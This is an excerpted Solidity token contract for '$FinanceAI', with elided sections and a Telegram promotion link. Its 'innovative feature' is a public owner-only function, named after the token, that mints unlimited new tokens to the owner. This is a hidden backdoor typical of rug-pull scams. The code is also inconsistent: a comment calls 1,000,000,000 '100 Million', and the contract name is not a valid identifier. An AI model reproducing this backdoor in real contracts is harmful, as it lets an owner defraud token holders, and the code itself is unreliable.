...
//
// $FinanceAI proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FinanceAI
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FinanceAI(uint256 amount) public onlyOwner {
 _FinanceAI(msg.sender, amount);
    }
    ...
    function _FinanceAI(address account, uint256 amount) internal virtual {
...
contract $FinanceAI is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Finance AI", "FINANCEAI") {
     _FinanceAI(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}